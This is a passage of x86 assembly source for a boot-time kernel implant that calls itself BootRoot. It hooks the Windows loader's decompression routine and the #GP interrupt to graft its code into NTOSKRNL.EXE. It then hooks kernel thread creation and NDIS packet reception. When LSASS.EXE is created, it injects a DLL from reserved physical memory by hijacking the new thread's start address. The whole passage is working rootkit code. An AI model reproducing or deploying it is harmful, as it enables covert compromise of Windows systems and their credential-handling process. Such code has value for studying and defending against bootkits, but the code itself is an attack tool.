	mov		[ebx+(0Dh*8)], ax			; gate offset (EIP) low word
	mov		word ptr [ebx+(0Dh*8)+2], cs		; gate code selector (32-bit code segment)
	mov		ax, 8E00h				; Present, IntG32, 0 parameters
	mov		[ebx+(0Dh*8)+4], eax			; gate attributes and high word of offset

	;
	; Shorten CS: GDT descriptor limit to < 2GB
	;

	push		eax
	sgdt		[esp-2]					; GDT base will be stored at ESP
	pop		eax
	and		byte ptr [eax+0008h+6], 0F7h		; 0008h = KGDT_R0_CODE; bit 51 of descriptor is raw limit bit 19

IF WYSE

	;
	; Hack for Wyse client compressed NTOSKRNL.EXE image
	;

	mov		edi, 0041B58Ch				; OSLOADER.EXE!RtlDecompressBuffer

	cmp		dword ptr [edi], 33EC8B55h
	jne		short @LIDTHook_unwyse
	cmp		dword ptr [edi+4], 08458AC0h
	je		short @LIDTHook_wyse

@LIDTHook_unwyse:

	popad
	ret

@LIDTHook_wyse:

	call		@LIDTHook_overrtldbhook

	;--- RtlDecompressBuffer hook

@LIDTHook_rtldbhook:

	mov		eax, esp
	push		dword ptr [eax+18h]
	push		dword ptr [eax+14h]
	push		dword ptr [eax+10h]
	push		dword ptr [eax+0Ch]
	push		dword ptr [eax+08h]
	push		dword ptr [eax+04h]
	call		@LIDTHook_overrtldbexithook

	;--- RtlDecompressBuffer exit hook

	pushad
	mov		ecx, [esp+20h+0Ch]
	cmp		ecx, 1000h
	jb		short @LIDTHook_rtldbexithook_ignore
	sub		ecx, 7Ch

	mov		esi, [esp+20h+08h]
	cmp		word ptr [esi], 5A4Dh
	jne		short @LIDTHook_rtldbexithook_ignore

	mov		eax, [esi+3Ch]				;IMAGE_DOS_HEADER.e_lfanew
	cmp		eax, 40h
	jb		short @LIDTHook_rtldbexithook_ignore
	sub		ecx, eax
	jb		short @LIDTHook_rtldbexithook_ignore

	add		esi, eax
	cmp		word ptr [esi], 4550h			; (short)IMAGE_NT_HEADERS.Signature == IMAGE_NT_SIGNATURE ("PE")
	jne		short @LIDTHook_rtldbexithook_ignore
	test		byte ptr [esi+17h], 20h			; IMAGE_NT_HEADER.FileHeader.Characteristics & IMAGE_FILE_DLL
	jnz		short @LIDTHook_rtldbexithook_ignore
	cmp		dword ptr [esi+78h], 0			; IMAGE_NT_HEADER.OptionalHeader.DataDirectory
	jz		short @LIDTHook_rtldbexithook_ignore	;   [IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress

	db 83h, 05h						; 83h/05h/0041B58Dh/xx: ADD DWORD PTR DS:[0041B58Dh], simm8
	dd (0041B58Ch + 1)					;   (deactivates RtlDecompressBuffer hook)
	db (@LIDTHook_overrtldbexithook - @LIDTHook_rtldbhook)

	mov		edx, [esi+58h]				; IMAGE_NT_HEADERS.OptionalHeader.CheckSum
	sub		edx, [esi+50h]				; IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
	add		dh, ((BOOTROOT_PAGES * 1000h) / 100h)
	adc		dx, 0
	add		edx, [esi+50h]
	mov		[esi+58h], edx				; checksum is a 16-bit checksum + 32-bit virtual size of image
	add		dword ptr [esi+50h], (BOOTROOT_PAGES * 1000h) ; increase IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage

  @LIDTHook_rtldbexithook_ignore:

	popad
	ret 18h

	;--- end of exit hook

@LIDTHook_overrtldbexithook:

	push		ebp
	mov		ebp, esp
	xor		eax, eax
	push		(0041B58Ch + 5)
	ret

	;--- end of hook

@LIDTHook_overrtldbhook:

	mov		al, 0E9h				; E9h/xxxxxxxx: JMP NEAR rel32
	stosb
	pop		eax
	sub		eax, edi
	sub		eax, 4
	stosd

ENDIF

	popad
	ret


;##################################################
;##  INT 0Dh Hook 32-Bit Protected Mode Handler  ##
;##################################################

@Int0DHook:

	pushad							; (assume DS and ES are flat 4GB segments)

	;
	; Determine if fault occurred at NTOSKRNL EP, or at OSLOADER "CALL" transfer to NTOSKRNL
	;

	mov		ebp, esp
	xor		ecx, ecx

		; Fault will be at target EIP for near execution transfers outside CS limit in VMware emulation
		; mode only; real processors will throw the GPF before the transfer instruction takes place.

	cmp		dword ptr [ebp+20h+4], ecx		; EIP from IRETD stack frame (error code is at [ESP+20h])
	mov		edi, [ebp+20h+10h+4]			; EDI = stack arg if fault was at CALL destination in NTOSKRNL
	jl		short @Int0DHook_gotarg			; original EIP >= 80000000h: [original ESP + 4] = stack arg

	mov		edi, [ebp+20h+10h]			; EDI = stack arg if fault occurred at CALL in OSLOADER

@Int0DHook_gotarg:

	;
	; Restore CS: segment limit
	;

	push		eax
	sgdt		[ebp-6]					; (EBP - 6) == (current ESP - 2)
	pop		eax					; now EAX = base address of GDT

	or		byte ptr [eax+0008h+6], 0Fh		; set raw limit bits 19..16 (RETF reloads CS shadow descriptor)

	;
	; Search _BlLoaderBlock module list for NDIS.SYS
	;

	call		GetEffectiveBase			; ESI = pointer to start of our code still in conventional memory

	push		edi					; preserve pointer to module list for locating NTOSKRNL.EXE below

	mov		ah, 1Ch					; hash of "NDIS.SYS"
	mov		cl, 8*2
	call		FindModuleInList
	jc		short @Int0DHook_nondissys

	test		word ptr [eax+20h], 0FFFh		; if LDR_MODULE.SizeOfImage is a 4KB multiple, then image is
	jz		short @Int0DHook_ndisaligned		;   (probably) virtually aligned, else it's raw file contents

	mov		byte ptr ds:[esi + BRCODE16_SIZE + (TRANSLATE_DISABLED - @BRCODE32_START)], ch ; enable RVA/raw translation

@Int0DHook_ndisaligned:

	mov		ds:[esi + BRCODE16_SIZE + (IMM_NDISBASE - @BRCODE32_START)], ebx

@Int0DHook_nondissys:

	pop		edi					; restore EDI as pointer to beginning of module list

	;
	; Search _BlLoaderBlock module list for NTOSKRNL
	;

	mov		ah, 0BCh				; hash of "NTOSKRNL.EXE"
	mov		cl, 12*2
	call		FindModuleInList			; assume we'll find it

	;
	; Append our code to NTOSKRNL image
	;

	mov		edx, [ebx+3Ch]				; IMAGE_DOS_HEADER.e_lfanew
	add		edx, ebx

		; calculate size of our code, rounded up to a multiple of section alignment

	mov		edi, [edx+38h]				; IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment
	neg		edi					; EDI = -SectionAlignment, but also ~(SectionAlignment-1)

	mov		ebp, BOOTROOT_SIZE
	push		ebp					; we'll want to use this value to copy our code later

	sub		ebp, edi				; EBP -= -SectionAlignment --> EBP += SectionAlignment
	and		ebp, edi				; EBP = BOOTROOT_SIZE rounded up to next section alignment multiple

		; increase image size

	; we already increased SizeOfImage in INT 13h ISR, so both header and module entry should reflect this
	;add		[eax+20h], ebp				; increase size of image in module list entry
	;add		[edx+50h], ebp				; IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage

		; adjust sizes and characteristics of last section in image

	movzx		ecx, word ptr [edx+06h]			; IMAGE_NT_HEADERS.FileHeader.NumberOfSections
	movzx		eax, word ptr [edx+14h]			; IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
	lea		edx, [edx+eax+18h]			; IMAGE_FIRST_SECTION(EDX)
	dec		ecx
	imul		ecx, ecx, 28h				; ECX = (number of sections - 1) * sizeof(IMAGE_SECTION_HEADER)
	add		edx, ecx				; now EDX points to last section

	mov		edi, [edx+08h]				; IMAGE_SECTION_HEADER.VirtualSize
	add		edi, [edx+0Ch]				; IMAGE_SECTION_HEADER.VirtualAddress
	add		edi, ebx				; now EDI points past end of last section's contents

	add		[edx+08h], ebp				; increase IMAGE_SECTION_HEADER.VirtualSize
	add		[edx+10h], ebp				; increase IMAGE_SECTION_HEADER.SizeOfRawData
	and		byte ptr [edx+24h+3], NOT 02h		; - IMAGE_SCN_MEM_DISCARDABLE
	or		dword ptr [edx+24h], 0E8000020h		; + (IMAGE_SCN_MEM_{WRITE,READ,EXECUTE,NOT_PAGED}|IMAGE_SCN_CNT_CODE)

		; copy our code to newly allocated space

	pop		ecx					; ECX = BOOTROOT_SIZE

	push		edi					; preserve pointer to start of code; we'll store "imports" here

	rep movsb

	sub		edi, (BOOTROOT_SIZE - (BRCODE16_SIZE + @Int0DHook_executepermanent - @BRCODE32_START))
	push		cs
	push		edi					; abandon conventional memory; transfer to copy within NTOSKRNL
	retf							; do a RETF to update CS shadow descriptor with new limit

@Int0DHook_executepermanent:

	pop		edi					; restore EDI as pointer to start of our NTOSKRNL-resident code

	;
	; Look up imports from NTOSKRNL
	;

	call		@Int0DHook_overhashes

@Int0DHook_hashes:

	db  41h			;  (InterlockedDecrement)
	db 0E6h			; IoAllocateMdl
	db  75h			; IoFreeMdl
	db 0ACh			; KeAttachProcess
	db  95h			; KeDetachProcess
	db  03h			;  (MmMapVideoDisplay)
	db  1Eh			; MmMapViewInSystemSpace
	db  91h			; MmMapViewOfSection
	db 0AEh			; MmProbeAndLockPages
	db  27h			; MmUnlockPages
	db  6Dh			; ObDereferenceObject
	db  87h			; ObReferenceObjectByHandle
	db  6Fh			; PsCreateSystemThread
	db 0AFh			; PsProcessType
	db 0ACh			;  (WRITE_REGISTER_BUFFER_USHORT)
	db  2Fh			; ZwAllocateVirtualMemory
	db  36h			; ZwClose
	db  51h			; ZwCreateSection
	db  7Fh			; ZwDuplicateObject
	db  59h			; ZwMapViewOfSection
	db  22h			; ZwOpenSection
	db  87h			; ZwQueryInformationProcess
	db  7Dh			; ZwUnmapViewOfSection

@Int0DHook_overhashes:

	pop		esi

	mov		cl, (@Int0DHook_overhashes - @Int0DHook_hashes) ; ECX = number of hashes (was 0 from REP MOVSB above)
	call		LookupImports
	jc		short @Int0DHook_fail_c_1

	;
	; Get PspCreateThread from PsCreateSystemThread
	;

	mov		al, 0E8h				; E8h: CALL rel32
	push		edi

	mov		cl, 30h					; arbitrary scan length

	mov		edi, [edi+PsCreateSystemThread]
	add		edi, 20h				; skip beginning of function to avoid any prolog-establishing CALL

@Int0DHook_pspctloop:

	repne scasb
	stc							; set carry so we can short-jump to a "JC @Int0DHook_fail"
	jne		short @Int0DHook_fail_c_1		;   (JNE will only jump if ZF clear -- disregards CF)

	mov		edx, [edi]				; offset of destination relative to end of CALL instruction
	lea		edx, [edi+edx+4]			; pointer to PspCreateThread

	cmp		edx, ebx
	jb		short @Int0DHook_pspctloop
	cmp		edx, [esp]				; stored EDI is roughly a pointer past last NTOSKRNL section
	jae		short @Int0DHook_pspctloop

	pop		edi
	mov		[edi+PspCreateThread], edx

	;
	; Initialize run-time global variables
	;

	xor		esi, esi

	mov		dword ptr [edi+G_PROCESSNAMEOFS], esi
	or		dword ptr [edi+G_NEWPROCESSPOOL], -1 ; set to MAX_UINT
	mov		dword ptr [edi+G_DLLSIZE], 00000000h
IMM_DLLSIZE EQU $-4
	mov		eax, 00000000h
IMM_DLLPHYSICAL EQU $-4
	mov		dword ptr [edi+G_DLLPHYSICAL], eax
	add		eax, 524288				; G_DLLPHYSICAL is first 512KB of reserved 1MB;
	mov		dword ptr [edi+G_RAWPHYSICAL], eax	;   G_RAWPHYSICAL is second 512KB
	mov		dword ptr [edi+G_WOLLIST], esi

	add		edi, (SIZE_IMPORTS + SIZE_GLOBALS)	; allocate space for global variables

	;
	; Hook MmMapViewOfSection
	;

	push		edx					; temporarily store address of PspCreateThread
	mov		esi, [edi - (SIZE_IMPORTS+SIZE_GLOBALS) + MmMapViewOfSection]
	lea		edx, [edi - (SIZE_IMPORTS+SIZE_GLOBALS) + BRCODE16_SIZE + (MmMapViewOfSection_Hook - @BRCODE32_START)]
	call		HookFunction
	pop		esi
	jc		short @Int0DHook_fail_c_1
								; now ESI = PspCreateThread, EDX = PspCreateThread_Hook
	add		edx, (PspCreateThread_Hook - MmMapViewOfSection_Hook)

	;
	; Hook PspCreateThread
	;

	call		HookFunction
@Int0DHook_fail_c_1:
	jc		short @Int0DHook_fail

	;
	; Find ethFilterDprIndicateReceivePacket in NDIS.SYS
	;

	mov		ebx, 00000000h				; EBX = NDIS.SYS image base
IMM_NDISBASE EQU $-4
	test		ebx, ebx
	jz		short @Int0DHook_skipndisethfdirp

	push		edi

		; search for ndisMLoopbackPacketX call to ethFilterDprIndicateReceivePacket

	mov		edi, ebx

@Int0DHook_nmlpxloop:

	mov		al, 50h					; 50                      PUSH EAX
								; 53                      PUSH EBX
								; C7 46 10 0E 00 00 00    MOV DWORD PTR [ESI+10h], 0Eh
	scasb
	jne		short @Int0DHook_nmlpxloop		; assume we'll find it eventually (if not we'll crash)

	cmp		dword ptr [edi], 1046C753h
	jne		short @Int0DHook_nmlpxloop

	cmp		dword ptr [edi+4], 0Eh
	jne		short @Int0DHook_nmlpxloop

	lea		eax, [edi+0Dh]
	sub		eax, ebx

	push		eax
	call		TranslateRawToVirtual
	pop		eax					; EDX = RVA of offset following CALL instruction
	
	add		eax, [edi+9]				; EDX += 'rel32' of CALL

	push		eax
	call		TranslateVirtualToRaw
	pop		esi
	add		esi, ebx				; ESI = ptr to start of ethFDIRP in potentially raw image

	pop		edi					; restore EDI as pointer to location for hook stub

	;
	; Hook NDIS.SYS!ethFilterDprIndicateReceivePacket
	; (NDIS.SYS is loaded by OSLOADER because it is a boot driver, but it will probably be relocated by NTOSKRNL)
	;

	push		7					; displace at least 7 bytes so we can hook with a "CALL FAR abs"
	call		DisassembleProlog
	pop		eax
	jc		short @Int0DHook_fail

	add		edx, (ethFilterDprIndicateReceivePacket_Hook - PspCreateThread_Hook) ; now EDX = ethFDIRP_Hook

	pushad							; preserve ECX, ESI, and EDI

	mov		al, 0E8h				; E8h/xxxxxxxx: CALL hook_function
	stosb
	lea		eax, [edx-4]
	sub		eax, edi
	stosd

	rep movsb						; copy "prolog" code to be displaced

	mov		al, 0EAh				; EAh/xxxxxxxx/0008h: JMP FAR 0008h:(ethFDIRP+displacement)
	stosb
	mov		word ptr [edi+4], cs			; offset field will be filled later before it's used

								; keep a pointer to offset portion of JMP FAR operand
	mov		[edx + (ETHFDIRP_RETOFS - ethFilterDprIndicateReceivePacket_Hook)], edi

	popad

	xchg		esi, edi
	sub		ecx, 7
	mov		al, 90h					; store enough NOPs so that "CALL FAR abs"
	rep stosb						;   hook is flush with end of displaced code

	mov		al, 9Ah					; 9Ah/xxxxxxxx/0008h: CALL FAR 0008h:hook_stub
	stosb
	xchg		eax, esi				; now EAX points to start of hook stub
	stosd

	mov		word ptr [edi], cs

@Int0DHook_skipndisethfdirp:

	;
	; Resume execution of NTOSKRNL's entry point
	;

	mov		word ptr ds:[000B809Eh], 8E01h		; *** blinking yellow smiley, up-right corner ***

@Int0DHook_fail:

	popad
	add		esp, 4					; remove #GP error code
	iretd


;###############################
;##  NTOSKRNL function hooks  ##
;###############################
PspCreateThread_Hook proc

	; Stack frame:  (arguments from http://www.reactos.com/doxygen/ntoskrnl/ps_2thread_8c.html)
	;
	; [ESP+30h] = IN PVOID			StartContext OPTIONAL
	; [ESP+2Ch] = IN PKSTART_ROUTINE	StartRoutine OPTIONAL
	; [ESP+28h] = IN BOOLEAN		CreateSuspended
	; [ESP+24h] = IN PINITIAL_TEB		InitialTeb
	; [ESP+20h] = IN PCONTEXT		ThreadContext
	; [ESP+1Ch] = OUT PCLIENT_ID		ClientId
	; [ESP+18h] = IN PEPROCESS		TargetProcess (OPTIONAL?)
	; [ESP+14h] = IN HANDLE			ProcessHandle (OPTIONAL?)
	; [ESP+10h] = IN POBJECT_ATTRIBUTES	ObjectAttributes OPTIONAL
	; [ESP+0Ch] = IN ACCESS_MASK		DesiredAccess
	; [ESP+08h] = OUT PHANDLE		ThreadHandle
	; [ESP+04h] = return address to PspCreateThread caller
	; [ESP]     = return address to displaced code in hook stub

	pushfd
	pushad

PSPCTH_ALLOCSIZE		EQU 04h
PSPCTH_ALLOCBASE		EQU 08h
PSPCTH_VIEWBASE			EQU 0Ch
PSPCTH_VIEWSIZE			EQU 10h
PSPCTH_VIEWBASERAW		EQU 14h
PSPCTH_VIEWSIZERAW		EQU 18h
PSPCTH_PROCESS			EQU 1Ch
PSPCTH_HSECTION			EQU 20h
PSPCTH_HSECTIONRAW		EQU 24h
PSPCTH_ORIGINALEIP		EQU 28h

	xor		eax, eax
	mov		ebp, esp
	push		eax					; initialize PSPCTH_ALLOCSIZE = 0
	push		eax					; initialize PSPCTH_ALLOCBASE = 0
	push		eax					; initialize PSPCTH_VIEWSIZE = 0
	push		eax					; initialize PSPCTH_VIEWBASE = 0
	push		eax					; initialize PSPCTH_VIEWSIZERAW = 0
	push		eax					; initialize PSPCTH_VIEWBASERAW = 0
	sub		esp, 10h

	;
	; Get pointer to process object
	;

	call		GetEffectiveBase

	mov		ebx, [ebp+24h+18h]			; use TargetProcess just for searching for process name offset
	test		ebx, ebx
	jz		short @PspCreateThread_Hook_notargetprocess

	call		ScanForProcessNameOffset

@PspCreateThread_Hook_notargetprocess:

	mov		ecx, [ebp+24h+14h]			; we require ProcessHandle to be non-null, instead of keeping
	jecxz		@PspCreateThread_Hook_done		;   track of whether we're using ProcessHandle or TargetProcess
	cmp		ecx, -1					; we're interested in new processes only, so ignore case
	je		short @PspCreateThread_Hook_done	;   where a process is creating a thread within itself

	xor		eax, eax
	lea		edx, [ebp-PSPCTH_PROCESS]

	push		eax			; ObReferenceObjectByHandle: HandleInformation
	push		edx			; ObReferenceObjectByHandle: Object
	push		eax			; ObReferenceObjectByHandle: AccessMode = KPROCESSOR_MODE::KernelMode
	mov		edx, [esi+PsProcessType]		; PsProcessType import is a pointer to a pointer, so deref once
	push		dword ptr [edx]		; ObReferenceObjectByHandle: ObjectType
	push		eax			; ObReferenceObjectByHandle: DesiredAccess
	push		ecx			; ObReferenceObjectByHandle: Handle
	call		dword ptr [esi+ObReferenceObjectByHandle]
	inc		eax					; one byte smaller than 'TEST', but we need to do 'JLE' below
	jle		short @PspCreateThread_Hook_done

	mov		ebx, [ebp-PSPCTH_PROCESS]
	call		ScanForProcessNameOffset
	jnz		short @PspCreateThread_Hook_done_deref	; can't continue if we don't know where process name is kept

	call		OrangePalette				; implement "orangescale" palette; we have to do it multiple
								;   times because Windows will try to wrestle it away at startup

	;
	; Scan process object for target process name
	;

	add		ecx, ebx

	call		@PspCreateThread_Hook_overname
	db		"LSASS.EXE",0				; must always be uppercase (no 'a'..'z')
@PspCreateThread_Hook_overname:
	pop		edx

@PspCreateThread_Hook_charloop:

	mov		al, [ecx]
	cmp		al, 'a'
	jb		short @PspCreateThread_Hook_charloop_notlower
	cmp		al, 'z'
	ja		short @PspCreateThread_Hook_charloop_notlower
	and		al, NOT 20h				; convert to uppercase

  @PspCreateThread_Hook_charloop_notlower:

	cmp		al, [edx]
	jne		short @PspCreateThread_Hook_done_deref

	test		al, al
	jz		short @PspCreateThread_Hook_match

	inc		edx
	inc		ecx
	jmp		short @PspCreateThread_Hook_charloop

	;
	; Clean up and return to original caller
	;

@PspCreateThread_Hook_done_deref:

	push		dword ptr [ebp-PSPCTH_PROCESS] ; ObDereferenceObject: Object
	call		dword ptr [esi+ObDereferenceObject]

@PspCreateThread_Hook_done:

	mov		esp, ebp
	popad
	popfd
	ret


	;
	; Ensure that this is a new process being created
	;

@PspCreateThread_Hook_match:

	xor		ebx, ebx

	sub		esp, 2Ch				; allocate stack space for VM_COUNTERS
	mov		edi, esp

	push		ebx			; ZwQueryInformationProcess: ReturnLength
	push		2Ch			; ZwQueryInformationProcess: ProcessInformationLength = sizeof(VM_COUNTERS)
	push		edi			; ZwQueryInformationProcess: ProcessInformation
	push		3			; ZwQueryInformationProcess: ProcessInformationClass = PROCESS_INFORMATION_CLASS::ProcessVmCounters
	push		dword ptr [ebp+24h+14h]	; ZwQueryInformationProcess: ProcessHandle
	call		dword ptr [esi+ZwQueryInformationProcess]

	mov		edx, [edi+1Ch]				; VM_COUNTERS.QuotaPeakNonPagedPoolUse
	add		esp, 2Ch				; remove VM_COUNTERS structure from stack

	inc		eax
	jle		short @PspCreateThread_Hook_done_deref

	cmp		edx, [esi+G_NEWPROCESSPOOL]		; The idea is to compare the process's peak non-paged pool
	ja		short @PspCreateThread_Hook_done_deref	; usage to the lowest ever observed, which should be set
	mov		[esi+G_NEWPROCESSPOOL], edx		; when the target process is first created -- if it exceeds
								; that value, then the process is not new.  The value is
								; affected by creating a thread in the process, so this
								; should allow us to determine if this thread is the first.
	;
	; Allocate memory in target process for LdrLoadDll call
	;

	mov		edi, [ebp+24h+14h]			; process handle

	lea		ecx, [ebp-PSPCTH_ALLOCSIZE]
	lea		edx, [ebp-PSPCTH_ALLOCBASE]
	db 0C6h, 01h, DLLINJECT_ALLOCSIZE			; MOV BYTE PTR [ECX], DLLINJECT_ALLOCSIZE (MASM is not clever)

	push		40h			; ZwAllocateVirtualMemory: Protect = PAGE_EXECUTE_READWRITE
	push		1000h			; ZwAllocateVirtualMemory: AllocationType = MEM_COMMIT
	push		ecx			; ZwAllocateVirtualMemory: RegionSize
	push		ebx			; ZwAllocateVirtualMemory: ZeroBits
	push		edx			; ZwAllocateVirtualMemory: BaseAddress
	push		edi			; ZwAllocateVirtualMemory: ProcessHandle
	call		dword ptr [esi+ZwAllocateVirtualMemory]
	inc		eax
	jle		short @PspCreateThread_Hook_done_deref

	;
	; Create and map memory sections for DLL and raw BootRoot + DLL
	;

		; create memory section for virtually-aligned DLL contents

	xor		eax, eax				;;;***###***;;; to-do: EAX = pointer to process object
	mov		ecx, [esi+G_DLLSIZE]
	call		CreateDLLSection
	jnz		short @PspCreateThread_Hook_gotsection1

@PspCreateThread_Hook_abort_freemem:

	; to-do: ZwFreeVirtualMemory([ebp+24h+14h], &[ebp-PSPCTH_VIEWBASE], &(0), MEM_RELEASE)

	jmp		short @PspCreateThread_Hook_done_deref

@PspCreateThread_Hook_gotsection1:

	mov		[ebp-PSPCTH_HSECTION], eax

		; create memory section for raw BootRoot + DLL blob

	push		1					;;;***###***;;; to-do: EAX = (pointer to process object XOR 1)
	pop		eax
	mov		ecx, (BOOTROOT_SECTORS * 200h) + DLL_RAW_SIZE
	call		CreateDLLSection
	jnz		short @PspCreateThread_Hook_gotsection2

@PspCreateThread_Hook_abort_closesection1_freemem:

	push		dword ptr [ebp-PSPCTH_HSECTION] ; ZwClose: ObjectHandle
	call		dword ptr [esi+ZwClose]

	jmp		short @PspCreateThread_Hook_abort_freemem

@PspCreateThread_Hook_gotsection2:

	mov		[ebp-PSPCTH_HSECTIONRAW], eax

		; map temporary writable view of DLL section into target process

	lea		ecx, [ebp-PSPCTH_VIEWBASE]
	lea		edx, [ebp-PSPCTH_VIEWSIZE]

	push		04h			; ZwMapViewOfSection: Protect = PAGE_READWRITE
	push		ebx			; ZwMapViewOfSection: AllocationType
	push		2			; ZwMapViewOfSection: InheritDisposition = SECTION_INHERIT::ViewUnmap
	push		edx			; ZwMapViewOfSection: ViewSize
	push		ebx			; ZwMapViewOfSection: SectionOffset
	push		ebx			; ZwMapViewOfSection: CommitSize
	push		ebx			; ZwMapViewOfSection: ZeroBits
	push		ecx			; ZwMapViewOfSection: BaseAddress
	push		edi			; ZwMapViewOfSection: ProcessHandle
	push		dword ptr [ebp-PSPCTH_HSECTION] ; ZwMapViewOfSection: SectionHandle
	call		dword ptr [esi+ZwMapViewOfSection]
	inc		eax
	jg		short @PspCreateThread_Hook_gotview1

@PspCreateThread_Hook_abort_closesection2_freemem:

	push		dword ptr [ebp-PSPCTH_HSECTIONRAW] ; ZwClose: ObjectHandle
	call		dword ptr [esi+ZwClose]

	jmp		short @PspCreateThread_Hook_abort_closesection1_freemem

@PspCreateThread_Hook_gotview1:

		; map temporary writable view of raw BootRoot + DLL blob into target process

	lea		ecx, [ebp-PSPCTH_VIEWBASERAW]
	lea		edx, [ebp-PSPCTH_VIEWSIZERAW]

	push		04h			; ZwMapViewOfSection: Protect = PAGE_READWRITE
	push		ebx			; ZwMapViewOfSection: AllocationType
	push		2			; ZwMapViewOfSection: InheritDisposition = SECTION_INHERIT::ViewUnmap
	push		edx			; ZwMapViewOfSection: ViewSize
	push		ebx			; ZwMapViewOfSection: SectionOffset
	push		ebx			; ZwMapViewOfSection: CommitSize
	push		ebx			; ZwMapViewOfSection: ZeroBits
	push		ecx			; ZwMapViewOfSection: BaseAddress
	push		edi			; ZwMapViewOfSection: ProcessHandle
	push		dword ptr [ebp-PSPCTH_HSECTIONRAW] ; ZwMapViewOfSection: SectionHandle
	call		dword ptr [esi+ZwMapViewOfSection]
	inc		eax
	jg		short @PspCreateThread_Hook_gotview2

@PspCreateThread_Hook_abort_unmap1_closesection2_freemem:

	push		dword ptr [ebp-PSPCTH_VIEWBASE] ; ZwUnmapViewOfSection: BaseAddress
	push		edi			; ZwUnmapViewOfSection: ProcessHandle
	call		dword ptr [esi+ZwUnmapViewOfSection]

	jmp		short @PspCreateThread_Hook_abort_closesection2_freemem

@PspCreateThread_Hook_gotview2:

	;
	; Attach to process of interest
	;

	xor		ebx, ebx
	mov		bl, 0B8h				; EBX = FIELD_OFFSET(CONTEXT, Eip)
	add		ebx, [ebp+24h+20h]			; EBX = &(ThreadContext->Eip)

	clc							; attempt to safely read value at [EBX] into EAX
	call		ReadWriteUserDWORD
	jc		short @PspCreateThread_Hook_abort_unmap2_closesection2_freemem
	mov		[ebp-PSPCTH_ORIGINALEIP], eax		; store original start EIP for thread, before hijacking it

	push		dword ptr [ebp-PSPCTH_PROCESS] ; KeAttachProcess: Process
	call		dword ptr [esi+KeAttachProcess]
	cdq							; EDX = 0 if EAX indicates success
	inc		eax
	jg		short @PspCreateThread_Hook_attachokay

@PspCreateThread_Hook_abort_unmap2_closesection2_freemem:

	mov		edi, [ebp+24h+14h]

	push		dword ptr [ebp-PSPCTH_VIEWBASERAW] ; ZwUnmapViewOfSection: BaseAddress
	push		edi			; ZwUnmapViewOfSection: ProcessHandle
	call		dword ptr [esi+ZwUnmapViewOfSection]
	jmp		short @PspCreateThread_Hook_abort_unmap1_closesection2_freemem

@PspCreateThread_Hook_attachokay:

	;
	; Copy contents from physical memory into sections
	;

	xchg		eax, ebx				; temporarily preserve &(ThreadContext->Eip) in EAX
								;   (CopyPhysicalMemory consumes EBX but doesn't touch EAX)
	mov		ebx, [esi+G_DLLPHYSICAL]
	mov		ecx, [ebp-PSPCTH_VIEWSIZE]		; should equal [esi+G_DLLSIZE] rounded up to 4KB multiple
	mov		edi, [ebp-PSPCTH_VIEWBASE]
	call		CopyPhysicalMemory
	jc		short @PspCreateThread_Hook_abort_detach_unmap2_closesection2_freemem

	mov		ebx, [esi+G_RAWPHYSICAL]
	mov		ecx, [ebp-PSPCTH_VIEWSIZERAW]
	mov		edi, [ebp-PSPCTH_VIEWBASERAW]
	call		CopyPhysicalMemory
	jnc		short @PspCreateThread_Hook_copyphysokay

@PspCreateThread_Hook_abort_detach_unmap2_closesection2_freemem:

	call		dword ptr [esi+KeDetachProcess]
	jmp		short @PspCreateThread_Hook_abort_unmap2_closesection2_freemem

@PspCreateThread_Hook_copyphysokay:

	xchg		ebx, eax				; restore EBX = &(ThreadContext->Eip)

	;
	; Copy in DLL injection code
	;

	mov		edi, [ebp-PSPCTH_ALLOCBASE]

	pushad							; preserve ESI and EDI

	xor		ecx, ecx
	mov		cl, DLLINJECT_COPYSIZE
	add		esi, BRCODE16_SIZE + (@DLLInject - @BRCODE32_START)
	rep movsb
	mov		eax, [ebp-PSPCTH_ORIGINALEIP]		; last byte of @DLLInject code is 68h: PUSH imm,
	stosd							;   so we store original EIP immediately after it
	mov		al, 0C3h				; C3h: RET
	stosb

	mov		cl, LOOKUPIMPORTS_SIZE
	;add		esi, (LookupImports - @DLLInject_end)  -- unnecessary since LookupImports immediately follows @DLLInject
	rep movsb

	popad

	;
	; Detach from process and hijack thread being created
	;

	call		dword ptr [esi+KeDetachProcess]		; we can't do anything if it fails

	xchg		eax, edi
	stc							; attempt to safely store value in EAX at [EBX]
	call		ReadWriteUserDWORD			; overwrite ThreadContext->EIP with address of injected code
	jc		short @PspCreateThread_Hook_abort_unmap2_closesection2_freemem

	mov		edi, [ebp+24h+14h]

	push		dword ptr [ebp-PSPCTH_VIEWBASE] ; ZwUnmapViewOfSection: BaseAddress
	push		edi			; ZwUnmapViewOfSection: ProcessHandle
	call		dword ptr [esi+ZwUnmapViewOfSection]

	push		dword ptr [ebp-PSPCTH_VIEWBASERAW] ; ZwUnmapViewOfSection: BaseAddress
	push		edi			; ZwUnmapViewOfSection: ProcessHandle
	call		dword ptr [esi+ZwUnmapViewOfSection]

	;
	; Create a duplicate section handle in target process and close ours
	;   (we leave PSPCTH_HSECTIONRAW open forever so that section will exist whenever DLL requests it)
	;

	xor		eax, eax
	push		eax					; var to receive handle created in target process
	mov		ecx, esp

	push		eax			; ZwDuplicateObject: Options
	push		eax			; ZwDuplicateObject: InheritHandle
	push		eax			; ZwDuplicateObject: DesiredAccess
	push		ecx			; ZwDuplicateObject: TargetHandle
	push		edi			; ZwDuplicateObject: TargetProcessHandle
	mov		edi, [ebp-PSPCTH_HSECTION]
	push		edi			; ZwDuplicateObject: SourceHandle
	push		-1			; ZwDuplicateObject: SourceProcessHandle
	call		dword ptr [esi+ZwDuplicateObject]
	inc		eax
	pop		eax					; remove created handle value from stack
	jle		short @PspCreateThread_Hook_dupfailed	; if duplication failed, then our handle is last reference to
								;   section, so closing it would cause section to be destroyed

		; communicate section handle to hijacked thread via EBX register in thread context

	mov		[ebx-0B8h+0A4h], eax			; ThreadContext->Ebx

		; close our handle so that duplicate handle is last reference to section object

	push		edi			; ZwClose: ObjectHandle
	call		dword ptr [esi+ZwClose]

@PspCreateThread_Hook_dupfailed:

	push		ebp

	;
	; Create, map, and lock section for list of powering-down hosts
	;

	xor		ebp, ebp

	xor		ebx, ebx
	mov		bh, (1000h / 100h)			; EBX = 1000h (4KB)

	push		2					;;;***###***;;; to-do: EAX = (pointer to process object XOR 2)
	pop		eax
	mov		ecx, ebx				; use one 4KB page for list
	call		CreateDLLSection
